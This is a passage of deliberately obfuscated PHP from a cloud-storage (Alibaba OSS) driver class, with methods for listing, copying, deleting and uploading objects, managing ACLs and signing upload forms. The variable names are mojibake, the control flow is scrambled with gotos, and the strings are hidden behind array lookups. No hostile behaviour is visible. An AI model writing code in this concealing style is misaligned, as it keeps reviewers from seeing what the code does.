isBucketCors() { goto C¾ï¥…ŸÂ®; E®´¶åó®: $böŠ¥®”ÂĞ = array($CÍ„ª§Ø‡ª[184], $CÍ„ª§Ø‡ª[185], $CÍ„ª§Ø‡ª[186], $CÍ„ª§Ø‡ª[187], $CÍ„ª§Ø‡ª[188]); $Fª’¼¢„ÒŞ = array_diff($böŠ¥®”ÂĞ, $DõÇ±±µ£ã); return empty($Fª’¼¢„ÒŞ); goto DÙÑ¤˜µ‡ö; C¾ï¥…ŸÂ®: $CÍ„ª§Ø‡ª =& $_SERVER[…Ò×–]; $f–Æµ½Ú·µ = $this->getBucketCors(); if (!$f–Æµ½Ú·µ || !is_array($f–Æµ½Ú·µ)) { return !1; } goto aÃÑÄ÷ò™ˆ; aÃÑÄ÷ò™ˆ: if ($f–Æµ½Ú·µ[$CÍ„ª§Ø‡ª[179]] != $CÍ„ª§Ø‡ª[180] || $f–Æµ½Ú·µ[$CÍ„ª§Ø‡ª[181]] != $CÍ„ª§Ø‡ª[180]) { return !1; } $DõÇ±±µ£ã = array_map($CÍ„ª§Ø‡ª[182], $f–Æµ½Ú·µ[$CÍ„ª§Ø‡ª[183]]); if (!is_array($DõÇ±±µ£ã)) { $DõÇ±±µ£ã = array(); } goto E®´¶åó®; DÙÑ¤˜µ‡ö: } public function mkfile($cÎò­õ²Ì, $dÅ¢¡ß‰öù = '', $F¼—ÅÁ˜ÉÜ = REPEAT_RENAME) { $c„ßòˆ´ÊÌ = $this->setContent($cÎò­õ²Ì, $dÅ¢¡ß‰öù); if ($c„ßòˆ´ÊÌ !== !1) { return $this->getPathOuter($cÎò­õ²Ì); } return !1; } public function mkdir($d“©±ëÔ¯, $C©‚¼óˆ„Ÿ = REPEAT_SKIP) { if ($this->_isFolder($d“©±ëÔ¯)) { return $this->getPathOuter($d“©±ëÔ¯); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d“©±ëÔ¯)); } catch (OSS\Core\OssException $DíÖÄ§õò) { return !1; } return $this->getPathOuter($d“©±ëÔ¯); } private function fileList($BğÊ„ìÎòš, $eƒéã”³¢ = '', $eßçèâŞš² = 0) { goto B‡¦¤¬ùƒï; B‡¦¤¬ùƒï: $c´ë…øÆà =& $_SERVER[…Ò×–]; $BğÊ„ìÎòš = trim($BğÊ„ìÎòš, $c´ë…øÆà[8]); $E½¸ã‘ô×° = empty($BğÊ„ìÎòš) ? $c´ë…øÆà[33] : $BğÊ„ìÎòš . $c´ë…øÆà[8]; goto a™—Öæ—ˆÈ; a™—Öæ—ˆÈ: $fØæ‡ÃÈĞÅ = $c´ë…øÆà[33]; $aâË®¶ÎÑ­ = 1000; $f¦÷‡‘³Õ„ = $Dİóµ¬ëŠ = array(); goto eŞÑçªè«; eŞÑçªè«: while (!0) { $dî½ö„­´ì = array($c´ë…øÆà[1194] => $eƒéã”³¢, $c´ë…øÆà[190] => $E½¸ã‘ô×°, $c´ë…øÆà[1195] => $aâË®¶ÎÑ­, $c´ë…øÆà[1196] => $fØæ‡ÃÈĞÅ); try { $cï¼“ğ¬† = $this->client->listObjects($this->bucket, $dî½ö„­´ì); } catch (OSS\Core\OssException $CĞ˜·è±¥Õ) { break; } $fØæ‡ÃÈĞÅ = $cï¼“ğ¬†->getNextMarker(); $aÛ´†ˆù™š = $cï¼“ğ¬†->getObjectList(); $Bé‹¹Ã¼ˆÖ = $cï¼“ğ¬†->getPrefixList(); foreach ($aÛ´†ˆù™š as $cÃğ¥Ä²ñ­) { if ($cÃğ¥Ä²ñ­->getKey() == $E½¸ã‘ô×°) { continue; } $f«†µğ³‡ = $cÃğ¥Ä²ñ­->getKey(); if ($eßçèâŞš²) { $f«†µğ³‡ = array($c´ë…øÆà[28] => $f«†µğ³‡, $c´ë…øÆà[77] => $cÃğ¥Ä²ñ­->getSize(), $c´ë…øÆà[194] => strtotime($cÃğ¥Ä²ñ­->getLastModified())); } $Dİóµ¬ëŠ[] = $f«†µğ³‡; } foreach ($Bé‹¹Ã¼ˆÖ as $cÃÅŸŠµš·) { $f¦÷‡‘³Õ„[] = $cÃÅŸŠµš·->getPrefix(); } if ($fØæ‡ÃÈĞÅ === $c´ë…øÆà[33]) { break; } } return array($c´ë…øÆà[74] => $f¦÷‡‘³Õ„, $c´ë…øÆà[73] => $Dİóµ¬ëŠ); goto CÖòì·î”š; CÖòì·î”š: } public function copyFile($cñ­åŠä, $fÊ…¼ìÓõ¡) { $Eİƒµï‹Ö = $this->size($cñ­åŠä); if ($Eİƒµï‹Ö < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $cñ­åŠä, $this->bucket, $this->pathEncode($fÊ…¼ìÓõ¡)); } catch (OSS\Core\OssException $C”Šëíİ‚‚) { return !1; } return $this->getPathOuter($fÊ…¼ìÓõ¡); } $dÛãÚ«Êó = $this->multiCopyObject($cñ­åŠä, $fÊ…¼ìÓõ¡, $Eİƒµï‹Ö); return $dÛãÚ«Êó ? $this->getPathOuter($fÊ…¼ìÓõ¡) : !1; } private function multiCopyObject($Aì°ÆòÆå×, $eà¬ÇÔ…Ñ¸, $EĞäñ§©) { $a¸”åâ½Ã° =& $_SERVER[…Ò×–]; try { goto a­í·Â¬‰; e‘™ãëØÕ¹: $c”˜°†Œ·¼ = 1; $aĞ¦¸œßÇÂ = 0; $cÛ°¸ÎöÓÖ = array(); goto bğÂ­ĞÂ‚Ã; bğÂ­ĞÂ‚Ã: $f­š‰¼ÙÊ¬ = 1024 * 1024 * 10; $bÂƒ­†³­ = $this->client->generateMultiuploadParts($EĞäñ§©, $f­š‰¼ÙÊ¬); foreach ($bÂƒ­†³­ as $DâÀù¨Âƒ– => $d®î’„Ğ²á) { $BñÅèÄ‡¿š = $aĞ¦¸œßÇÂ + (int) $d®î’„Ğ²á[$a¸”åâ½Ã°[1198]]; $aåµšĞã¨Å = (int) $d®î’„Ğ²á[$a¸”åâ½Ã°[329]] + $BñÅèÄ‡¿š - 1; $AØºµÙš › = array($a¸”åâ½Ã°[1199] => $BñÅèÄ‡¿š, $a¸”åâ½Ã°[1200] => $aåµšĞã¨Å); $cÛ°¸ÎöÓÖ[] = $this->client->uploadPartCopy($this->bucket, $Aì°ÆòÆå×, $this->bucket, $this->pathEncode($eà¬ÇÔ…Ñ¸), $c”˜°†Œ·¼, $D´„º¾µÑè, $AØºµÙš ›); $c”˜°†Œ·¼ = $c”˜°†Œ·¼ + 1; } goto e¢Ê·š‘Î; a­í·Â¬‰: $D‚´ÈÜÎ¹ = array(); if ($B¨×‘Š™Ë  = $this->hashMd5($Aì°ÆòÆå×)) { $D‚´ÈÜÎ¹ = array(OSS\OssClient::OSS_HEADERS => array($a¸”åâ½Ã°[1197] => $B¨×‘Š™Ë )); } $D´„º¾µÑè = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eà¬ÇÔ…Ñ¸), $D‚´ÈÜÎ¹); goto e‘™ãëØÕ¹; e¢Ê·š‘Î: $eĞÊÔ³È = array(); foreach ($cÛ°¸ÎöÓÖ as $DâÀù¨Âƒ– => $fÈŸ¥“¤¼») { $eĞÊÔ³È[] = array($a¸”åâ½Ã°[1201] => $DâÀù¨Âƒ– + 1, $a¸”åâ½Ã°[1202] => $fÈŸ¥“¤¼»); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($eà¬ÇÔ…Ñ¸), $D´„º¾µÑè, $eĞÊÔ³È); goto bÀÎºÈÓ“‘; bÀÎºÈÓ“‘: } catch (OSS\Core\OssException $C÷ø¡¸†ğ) { return !1; } return !0; } public function moveFile($e“ñœÄ¬™, $b‚ùÍäÊİç) { if ($this->copyFile($e“ñœÄ¬™, $b‚ùÍäÊİç)) { $this->remove($e“ñœÄ¬™); return $this->getPathOuter($b‚ùÍäÊİç); } return !1; } public function delFile($dëç¢‚è¸Œ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dëç¢‚è¸Œ)); } catch (OSS\Core\OssException $FšîñÀéÏ•) { return !1; } return !0; } public function delFolder($C©å¯×©éÃ) { $aÕÄ§ØôÖè =& $_SERVER[…Ò×–]; $aØÍ‹¶…°ë = $this->fileList($C©å¯×©éÃ); if (!empty($C©å¯×©éÃ) && !in_array(trim($C©å¯×©éÃ, $aÕÄ§ØôÖè[8]) . $aÕÄ§ØôÖè[8], $aØÍ‹¶…°ë[$aÕÄ§ØôÖè[73]])) { $aØÍ‹¶…°ë[$aÕÄ§ØôÖè[73]][] = trim($C©å¯×©éÃ, $aÕÄ§ØôÖè[8]) . $aÕÄ§ØôÖè[8]; } foreach (array_chunk($aØÍ‹¶…°ë[$aÕÄ§ØôÖè[73]], 1000) as $d²íƒ‘…) { try { $this->client->deleteObjects($this->bucket, $d²íƒ‘…); } catch (OSS\Core\OssException $A•ï‘Û’ôÃ) { continue; } } return !0; } public function rename($d‡çµ°ˆ™¾, $DšÀõƒš‚) { return $this->renameObject($d‡çµ°ˆ™¾, $DšÀõƒš‚); } private function fileInfo($dÃø‚ƒ»Ş, $AÒî×œå±Â = array()) { goto bî’±†Ó; E“à×Œ‚«ª: if (isset($AÒî×œå±Â[$D­›ÈÎØò[77]])) { $D»ì¬ò[$D­›ÈÎØò[77]] = $AÒî×œå±Â[$D­›ÈÎØò[77]]; } if (isset($AÒî×œå±Â[$D­›ÈÎØò[107]])) { $D»ì¬ò[$D­›ÈÎØò[107]] = $AÒî×œå±Â[$D­›ÈÎØò[107]]; } if (isset($AÒî×œå±Â[$D­›ÈÎØò[194]]) && !trim($D»ì¬ò[$D­›ÈÎØò[107]])) { $D»ì¬ò[$D­›ÈÎØò[107]] = $AÒî×œå±Â[$D­›ÈÎØò[194]]; } goto FÁ Ò¤‚; FÁ Ò¤‚: return $D»ì¬ò; goto cœòÏ¦¿æ; bî’±†Ó: $D­›ÈÎØò =& $_SERVER[…Ò×–]; $D»ì¬ò = array($D­›ÈÎØò[28] => $this->pathThis($dÃø‚ƒ»Ş), $D­›ÈÎØò[75] => $this->getPathOuter($dÃø‚ƒ»Ş), $D­›ÈÎØò[29] => $D­›ÈÎØò[171], $D­›ÈÎØò[191] => 0, $D­›ÈÎØò[107] => 0, $D­›ÈÎØò[77] => 0, $D­›ÈÎØò[165] => $this->ext($dÃø‚ƒ»Ş), $D­›ÈÎØò[192] => !0, $D­›ÈÎØò[193] => !0); if (empty($AÒî×œå±Â)) { $A‰°ÊÌ„ÅÖ = $this->objectMeta($dÃø‚ƒ»Ş); if (!$A‰°ÊÌ„ÅÖ) { return $D»ì¬ò; } $AÒî×œå±Â = array($D­›ÈÎØò[107] => strtotime($A‰°ÊÌ„ÅÖ[$D­›ÈÎØò[1203]]), $D­›ÈÎØò[77] => $A‰°ÊÌ„ÅÖ[$D­›ÈÎØò[1204]] + 0); } goto E“à×Œ‚«ª; cœòÏ¦¿æ: } private function folderInfo($eæ„ªœªß“, $e…”‹šàÄ = array()) { $f¹øÂğÂ§ =& $_SERVER[…Ò×–]; $c¿Î¡÷¢À = array($f¹øÂğÂ§[28] => $this->pathThis($eæ„ªœªß“), $f¹øÂğÂ§[75] => $this->getPathOuter($f¹øÂğÂ§[8] . $eæ„ªœªß“), $f¹øÂğÂ§[29] => $f¹øÂğÂ§[76], $f¹øÂğÂ§[191] => 0, $f¹øÂğÂ§[107] => 0, $f¹øÂğÂ§[192] => !0, $f¹øÂğÂ§[193] => !0); if (empty($e…”‹šàÄ)) { $eæ„ªœªß“ = rtrim($eæ„ªœªß“, $f¹øÂğÂ§[8]) . $f¹øÂğÂ§[8]; $eïÛÒ£ïé = $this->objectMeta($eæ„ªœªß“); if (!$eïÛÒ£ïé) { return $c¿Î¡÷¢À; } $e…”‹šàÄ = array($f¹øÂğÂ§[191] => $eïÛÒ£ïé[$f¹øÂğÂ§[1205]][$f¹øÂğÂ§[1206]], $f¹øÂğÂ§[107] => strtotime($eïÛÒ£ïé[$f¹øÂğÂ§[1203]])); } if (isset($e…”‹šàÄ[$f¹øÂğÂ§[107]])) { $c¿Î¡÷¢À[$f¹øÂğÂ§[107]] = $e…”‹šàÄ[$f¹øÂğÂ§[107]]; } if (isset($e…”‹šàÄ[$f¹øÂğÂ§[191]])) { $c¿Î¡÷¢À[$f¹øÂğÂ§[191]] = $e…”‹šàÄ[$f¹øÂğÂ§[191]]; } return $c¿Î¡÷¢À; } public function listPath($E‡™ì‰Ôˆß, $EÒåÇóùº = false) { $CÆÊãì¾Æš =& $_SERVER[…Ò×–]; $c‘Ñ•ˆ‹Òµ = $this->fileList($E‡™ì‰Ôˆß, $CÆÊãì¾Æš[8], !0); foreach ($c‘Ñ•ˆ‹Òµ[$CÆÊãì¾Æš[74]] as $BÙ¹¶±Øá => $CöÓ†½•½Œ) { $c‘Ñ•ˆ‹Òµ[$CÆÊãì¾Æš[74]][$BÙ¹¶±Øá] = $this->folderInfo($CöÓ†½•½Œ, $CöÓ†½•½Œ); } foreach ($c‘Ñ•ˆ‹Òµ[$CÆÊãì¾Æš[73]] as $BÙ¹¶±Øá => $CöÓ†½•½Œ) { $c‘Ñ•ˆ‹Òµ[$CÆÊãì¾Æš[73]][$BÙ¹¶±Øá] = $this->fileInfo($CöÓ†½•½Œ[$CÆÊãì¾Æš[28]], $CöÓ†½•½Œ); } return $c‘Ñ•ˆ‹Òµ; } public function has($a¾áò»Äî©, $DÑğèê‡ĞÃ = false, $FËéÆ‹ôá = true) { goto aà¿óßĞñŠ; aà¿óßĞñŠ: $A·ğÂÓó¥‰ =& $_SERVER[…Ò×–]; $a¾áò»Äî© = trim($a¾áò»Äî©, $A·ğÂÓó¥‰[8]); $eãÏĞÑòË = empty($a¾áò»Äî©) ? $A·ğÂÓó¥‰[33] : $a¾áò»Äî© . $A·ğÂÓó¥‰[8]; goto Eà“÷ƒÍ; Eà“÷ƒÍ: $C„ß¼¨‹¼¯ = $A·ğÂÓó¥‰[33]; $aˆö°Ë´‚ì = 500; $aì‰÷¹‘–È = 0; goto B›Ïˆ­º‚Š; eì”ÈÎŞ¨±: return !1; goto f‘ÓÌ‚Ã; B›Ïˆ­º‚Š: $cÂåçÉ’ˆ = 0; while (!0) { $c“ÃÍíÍ‰Ç = array($A·ğÂÓó¥‰[1194] => $A·ğÂÓó¥‰[8], $A·ğÂÓó¥‰[190] => $eãÏĞÑòË, $A·ğÂÓó¥‰[1195] => $aˆö°Ë´‚ì, $A·ğÂÓó¥‰[1196] => $C„ß¼¨‹¼¯); try { $dóâïÁ¨• = $this->client->listObjects($this->bucket, $c“ÃÍíÍ‰Ç); } catch (OSS\Core\OssException $Aåñ‚£») { break; } $C„ß¼¨‹¼¯ = $dóâïÁ¨•->getNextMarker(); $AÚÃàà¶¥° = $dóâïÁ¨•->getObjectList(); $e‰ø‰¼»­ = $dóâïÁ¨•->getPrefixList(); if ($DÑğèê‡ĞÃ) { if (count($AÚÃàà¶¥°) > 1 || count($AÚÃàà¶¥°) == 1 && $AÚÃàà¶¥°[0]->getKey() != $eãÏĞÑòË) { $aì‰÷¹‘–È += count($AÚÃàà¶¥°) - 1; } if (!empty($e‰ø‰¼»­)) { $cÂåçÉ’ˆ += count($e‰ø‰¼»­); } if ($C„ß¼¨‹¼¯ === $A·ğÂÓó¥‰[33]) { break; } continue; } if ($FËéÆ‹ôá) { if (!empty($AÚÃàà¶¥°)) { if (count($AÚÃàà¶¥°) > 1 || $AÚÃàà¶¥°[0]->getKey() != $eãÏĞÑòË) { return !0; } } } else { if (!empty($e‰ø‰¼»­)) { return !0; } } if ($C„ß¼¨‹¼¯ === $A·ğÂÓó¥‰[33]) { break; } } if ($DÑğèê‡ĞÃ) { return array($A·ğÂÓó¥‰[195] => $aì‰÷¹‘–È, $A·ğÂÓó¥‰[196] => $cÂåçÉ’ˆ); } goto eì”ÈÎŞ¨±; f‘ÓÌ‚Ã: } public function listAll($cõÌß„—) { $dŸÂ¢Ğ÷ğ =& $_SERVER[…Ò×–]; $câ‰×‹Ìø¤ = $this->fileList($cõÌß„—, $dŸÂ¢Ğ÷ğ[33], !0); $CÖç„Şâ = array(); foreach ($câ‰×‹Ìø¤[$dŸÂ¢Ğ÷ğ[73]] as $Aß¬ôŒ©è») { $CÖç„Şâ[$Aß¬ôŒ©è»[$dŸÂ¢Ğ÷ğ[28]]] = $Aß¬ôŒ©è»[$dŸÂ¢Ğ÷ğ[77]]; } return $this->listAllFiles($cõÌß„—, array_keys($CÖç„Şâ), $CÖç„Şâ); } public function canRead($d†™‹ˆé) { $d£Îß°¿Ó =& $_SERVER[…Ò×–]; $CÑšß¶ÚåÌ = $this->pathAcl($d†™‹ˆé); return $CÑšß¶ÚåÌ == $d£Îß°¿Ó[1207] || $CÑšß¶ÚåÌ == $d£Îß°¿Ó[496] ? !0 : !1; } public function canWrite($D³‘âÌÆ½Ş) { $A‡‚¯±½”… = $this->pathAcl($D³‘âÌÆ½Ş); return $A‡‚¯±½”… == $_SERVER[…Ò×–][496] ? !0 : !1; } public function pathAcl($b´É‹Á¡Ÿ) { goto Céœ†«‚Ò; Céœ†«‚Ò: $e®Ç£ƒ¢Ü =& $_SERVER[…Ò×–]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $eœÌ¾‰ã¥Ø = $this->client->getObjectAcl($this->bucket, $this->pathEncode($b´É‹Á¡Ÿ)); } catch (OSS\Core\OssException $Bæ¿ÍÜãÈ) { return !1; } goto fÜ˜‘…µ‰; fÜ˜‘…µ‰: $D’áô²»ª£ = $eœÌ¾‰ã¥Ø == $e®Ç£ƒ¢Ü[34] ? $this->bucketAcl : $eœÌ¾‰ã¥Ø; if ($D’áô²»ª£ == $e®Ç£ƒ¢Ü[1208]) { return $e®Ç£ƒ¢Ü[1207]; } if ($D’áô²»ª£ == $e®Ç£ƒ¢Ü[1209]) { return $e®Ç£ƒ¢Ü[496]; } goto c¾Á¢»°¶õ; c¾Á¢»°¶õ: return $D’áô²»ª£; goto E© •˜Á³; E© •˜Á³: } private function chmodPath($CŠ¬Æí­‰‡, $F¯İçÈÛ´É = '') { $B¡Éô°‡‘‚ =& $_SERVER[…Ò×–]; $Fò¼æ¼†‚ = empty($F¯İçÈÛ´É) ? $B¡Éô°‡‘‚[1209] : $F¯İçÈÛ´É; $eë¯øŒ”Æ„ = array($B¡Éô°‡‘‚[34], $B¡Éô°‡‘‚[189], $B¡Éô°‡‘‚[1208], $B¡Éô°‡‘‚[1209]); if (!in_array($Fò¼æ¼†‚, $eë¯øŒ”Æ„)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($CŠ¬Æí­‰‡), $Fò¼æ¼†‚); } catch (OSS\Core\OssException $A¥éÓ×ëÊš) { return !1; } return !0; } public function getContent($EÀìƒÊæñÆ) { return $this->fileSubstr($EÀìƒÊæñÆ, -1); } public function setContent($A´ÌÓ«ù¯Í, $eíùèåñ˜” = '') { $aìÈô½¥Ó§ =& $_SERVER[…Ò×–]; try { $b™¼÷Ä¦Ê = $this->trafficLimit($aìÈô½¥Ó§[1210]); $c‡¢÷Ôóë¥ = $this->client->putObject($this->bucket, $this->pathEncode($A´ÌÓ«ù¯Í), $eíùèåñ˜”, $b™¼÷Ä¦Ê); } catch (OSS\Core\OssException $fßƒƒ‡¹ã—) { return !1; } $Bã†ºñ˜˜â = array($aìÈô½¥Ó§[1197] => trim($c‡¢÷Ôóë¥[$aìÈô½¥Ó§[1211]], $aìÈô½¥Ó§[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A´ÌÓ«ù¯Í))); $this->updateObjMeta($A´ÌÓ«ù¯Í, $Bã†ºñ˜˜â); return isset($c‡¢÷Ôóë¥[$aìÈô½¥Ó§[1212]][$aìÈô½¥Ó§[1159]]) ? (int) $c‡¢÷Ôóë¥[$aìÈô½¥Ó§[1212]][$aìÈô½¥Ó§[1159]] : strlen($c‡¢÷Ôóë¥); } private function updateObjMeta($b°ƒãª§¯, $C™Ş«ƒƒ†Ú) { $b°ƒãª§¯ = $this->pathEncode($b°ƒãª§¯); try { $dò…¢ »¶‚ = array(OSS\OssClient::OSS_HEADERS => $C™Ş«ƒƒ†Ú); $this->client->copyObject($this->bucket, $b°ƒãª§¯, $this->bucket, $b°ƒãª§¯, $dò…¢ »¶‚); } catch (OSS\Core\OssException $DÆß°ÆŠ) { return !1; } return !0; } public function upload($a‘¨ºŸ™‘õ, $d‰¤’ªŠ•Ş, $f’’Ã×ÑÒ = false, $a·ƒó‡† = REPEAT_REPLACE) { $a¯¾¯õÇ‡ =& $_SERVER[…Ò×–]; $fêàÍÖÎÖ‡ = trim($a‘¨ºŸ™‘õ, $a¯¾¯õÇ‡[8]); $aøäÀèˆŠ£ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a¯¾¯õÇ‡[1197] => @md5_file($d‰¤’ªŠ•Ş)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a‘¨ºŸ™‘õ))); $aøäÀèˆŠ£ = $this->trafficLimit($a¯¾¯õÇ‡[1210], $aøäÀèˆŠ£); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($fêàÍÖÎÖ‡), $d‰¤’ªŠ•Ş, $aøäÀèˆŠ£); } catch (OSS\Core\OssException $A¹‰„´Ò…ö) { return !1; } return $this->getPathOuter($a‘¨ºŸ™‘õ); } public function getHost() { $EÂˆÍŠõÁ¢ =& $_SERVER[…Ò×–]; $AÓ—Ç›Ì = explode($EÂˆÍŠõÁ¢[175], parent::getHost()); return $AÓ—Ç›Ì[0] . $EÂˆÍŠõÁ¢[175] . $this->bucket . $EÂˆÍŠõÁ¢[91] . $AÓ—Ç›Ì[1]; } public function uploadFormData($fŠêÚº¢¹ø, $Bõøï°­Ğ÷ = 3600) { goto eìĞ¤œëœÖ; a¢ëÉå‰â: $f¸â¦¹Å«— = date($c¬ßØ“Å‘Ã[1213], time() + $AŠì·ãàç); $EÁŒ˜„ÍÌ = new DateTime($f¸â¦¹Å«—); $bŒóÄƒÈ”° = $EÁŒ˜„ÍÌ->format(DateTime::ISO8601); goto Eé‹Ò¶ãÂ°; Eé‹Ò¶ãÂ°: $b‹áô‹İÚŞ = strpos($bŒóÄƒÈ”°, $c¬ßØ“Å‘Ã[288]); $bŒóÄƒÈ”° = substr($bŒóÄƒÈ”°, 0, $b‹áô‹İÚŞ) . $c¬ßØ“Å‘Ã[1214]; $EÈ‘ãã¿  = 1048576000 * 5; goto E‹œì¬¢ŠĞ; eìĞ¤œëœÖ: $c¬ßØ“Å‘Ã =& $_SERVER[…Ò×–]; if (!($BÕé˜›ìƒä = $this->getHost())) { return !1; } $AŠì·ãàç = $Bõøï°­Ğ÷; goto a¢ëÉå‰â; E‹œì¬¢ŠĞ: $c¥´‚öÊ‚µ = $this->pathFather($fŠêÚº¢¹ø); $c§Ø›Ùµ‚… = array($c¬ßØ“Å‘Ã[1112] => $bŒóÄƒÈ”°, $c¬ßØ“Å‘Ã[1113] => array(array($c¬ßØ“Å‘Ã[1215], 0, $EÈ‘ãã¿ ), array($c¬ßØ“Å‘Ã[1116], $c¬ßØ“Å‘Ã[1117], $c¥´‚öÊ‚µ))); $D×È÷Öøç = base64_encode(json_encode($c§Ø›Ùµ‚…)); goto b…°Ëø„‰Ÿ; b…°Ëø„‰Ÿ: $f¤šœ¥›ëŞ = base64_encode(hash_hmac($c¬ßØ“Å‘Ã[222], $D×È÷Öøç, $this->secret, !0)); $B§Ú„÷ğ×¸ = array($c¬ßØ“Å‘Ã[1122] => $D×È÷Öøç, $c¬ßØ“Å‘Ã[1216] => $this->accessKey, $c¬ßØ“Å‘Ã[1118] => $c¬ßØ“Å‘Ã[1110], $c¬ßØ“Å‘Ã[1217] => $f¤šœ¥›ëŞ, $c¬ßØ“Å‘Ã[173] => $BÕé˜›ìƒä); $B§Ú„÷ğ×¸ = $this->trafficLimit($c¬ßØ“Å‘Ã[1210], $B§Ú„÷ğ×¸); goto fÙâ÷Šè¾¡; fÙâ÷Šè¾¡: return $B§Ú„÷ğ×¸; goto D˜ê“—Ï¨Ë; D˜ê“—Ï¨Ë: } public function multiUploadFormData($CƒÚ™ƒ«¯, $B™·ò‰§ø© = 3600) { $bØòğÕÎŞä =& $_SERVER[…Ò×–]; if (!($BëÍ”÷Ç = $this->getHost())) { return !1; } $aò¶á»¢’¨ = $this->trafficLimit($bØòğÕÎŞä[1210]); $B‚Ò©ùĞ¨™ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($CƒÚ™ƒ«¯), $aò¶á»¢’¨); return array($bØòğÕÎŞä[213] => $B‚Ò©ùĞ¨™, $bØòğÕÎŞä[173] => $BëÍ”÷Ç . $bØòğÕÎŞä[8] . $this->pathEncode($CƒÚ™ƒ«¯), $bØòğÕÎŞä[214] => gmdate($bØòğÕÎŞä[1218]), $bØòğÕÎŞä[89] => $CƒÚ™ƒ«¯); } public function multiUploadAuthData($eÁğ‡¤Ñˆ™, $d™±­¥ª®¹ = array()) { goto C¶¦ÕÄ½Úì; C¶¦ÕÄ½Úì: $BóŸ³…òù’ =& $_SERVER[…Ò×–]; $F¨¯Ÿ»Ô‘è = isset($d™±­¥ª®¹[$BóŸ³…òù’[214]]) ? $d™±­¥ª®¹[$BóŸ³…òù’[214]] : gmdate($BóŸ³…òù’[1218]); $dî‡™Éš’§ = isset($d™±­¥ª®¹[$BóŸ³…òù’[165]]) ? $d™±­¥ª®¹[$BóŸ³…òù’[165]] : $BóŸ³…òù’[33]; goto cÕŠğ·›’Æ; cÕŠğ·›’Æ: $fä—–Â…›¯ = $eÁğ‡¤Ñˆ™; if (isset($d™±­¥ª®¹[$BóŸ³…òù’[89]])) { $fä—–Â…›¯ = $d™±­¥ª®¹[$BóŸ³…òù’[89]]; unset($d™±­¥ª®¹[$BóŸ³…òù’[89]]); } if (isset($d™±­¥ª®¹[$BóŸ³…òù’[215]])) { $d™±­¥ª®¹[$BóŸ³…òù’[214]] = $F¨¯Ÿ»Ô‘è; return $this->listUploadParts($fä—–Â…›¯, $d™±­¥ª®¹); } goto c›­Ê¦‚½ë; Eâ¾¢Ğ•·: if (!empty($d™±­¥ª®¹[$BóŸ³…òù’[1220]])) { $e°®‹ô•™è = array_merge(array($DÁ©¤åÅƒÍ[4]), $d™±­¥ª®¹[$BóŸ³…òù’[1220]]); sort($e°®‹ô•™è); $DÁ©¤åÅƒÍ[4] = implode($BóŸ³…òù’[221], $e°®‹ô•™è); } $dÚÆ›Şİ¼£ = implode($BóŸ³…òù’[221], $DÁ©¤åÅƒÍ); $F²Î›¸ƒù‚ = base64_encode(hash_hmac($BóŸ³…òù’[222], $dÚÆ›Şİ¼£, $this->secret, !0)); goto DÇ¯ŠŒ—Ÿä; DÇ¯ŠŒ—Ÿä: $CÍÃ×ƒŒ˜Ñ = $BóŸ³…òù’[1184] . $this->accessKey . $BóŸ³…òù’[4] . $F²Î›¸ƒù‚; if (strpos($dî‡™Éš’§, $BóŸ³…òù’[217]) === 0) { $CÍÃ×ƒŒ˜Ñ = array($BóŸ³…òù’[224] => $CÍÃ×ƒŒ˜Ñ, $BóŸ³…òù’[214] => $F¨¯Ÿ»Ô‘è); if ($Fä›¨Ä¹¯) { $CÍÃ×ƒŒ˜Ñ = array_merge($CÍÃ×ƒŒ˜Ñ, $Fä›¨Ä¹¯); } } return $CÍÃ×ƒŒ˜Ñ; goto c‹ÏÀ‡ó´; c›­Ê¦‚½ë: $DÁ©¤åÅƒÍ = array($BóŸ³…òù’[216], $BóŸ³…òù’[33], $BóŸ³…òù’[116], $F¨¯Ÿ»Ô‘è, "\x78\55\x6f\163\163\x2d\144\141\x74\145\72{$F¨¯Ÿ»Ô‘è}", $BóŸ³…òù’[8] . $this->bucket . $BóŸ³…òù’[8] . $fä—–Â…›¯ . $dî‡™Éš’§); if (strpos($dî‡™Éš’§, $BóŸ³…òù’[217]) === 0) { $DÁ©¤åÅƒÍ[0] = $BóŸ³…òù’[218]; if ($Fä›¨Ä¹¯ = $this->trafficLimit($BóŸ³…òù’[1210])) { $fä—–Â…›¯ = $BóŸ³…òù’[1219]; array_splice($DÁ©¤åÅƒÍ, 5, 0, $fä—–Â…›¯ . $BóŸ³…òù’[4] . $Fä›¨Ä¹¯[$fä—–Â…›¯]); } } if (isset($d™±­¥ª®¹[$BóŸ³…òù’[219]]) && $d™±­¥ª®¹[$BóŸ³…òù’[219]] == $BóŸ³…òù’[220]) { $DÁ©¤åÅƒÍ[0] = $BóŸ³…òù’[220]; } goto Eâ¾¢Ğ•·; c‹ÏÀ‡ó´: } public function listUploadParts($AŒ¹Ş“ù‰, $f³·³àì°Ş) { goto dÉ¦¥ÌÔ—í; dÉ¦¥ÌÔ—í: $DµÁÔÕ´Ó =& $_SERVER[…Ò×–]; $FæÄµÒİõå = parse_url_query($f³·³àì°Ş[$DµÁÔÕ´Ó[165]]); $aÑé„ÚØ•® = $this->client->listParts($this->bucket, $this->pathEncode($AŒ¹Ş“ù‰), $FæÄµÒİõå[$DµÁÔÕ´Ó[213]]); goto AÕ×Ö åÀÉ; AÕ×Ö åÀÉ: $BÆ§õ¼ŠË“ = $aÑé„ÚØ•®->getListPart(); $bÑÌöÅÚ¦ = array(); foreach ($BÆ§õ¼ŠË“ as $dèïŒ²µ) { $bÑÌöÅÚ¦[] = array($DµÁÔÕ´Ó[1201] => $dèïŒ²µ->getPartNumber(), $DµÁÔÕ´Ó[1202] => trim($dèïŒ²µ->getETag(), $DµÁÔÕ´Ó[113])); } goto b¸Ï¡ãÈ•ä; B»•„¼¼ø¹: return array($DµÁÔÕ´Ó[224] => $Dóó›âò‰˜, $DµÁÔÕ´Ó[214] => 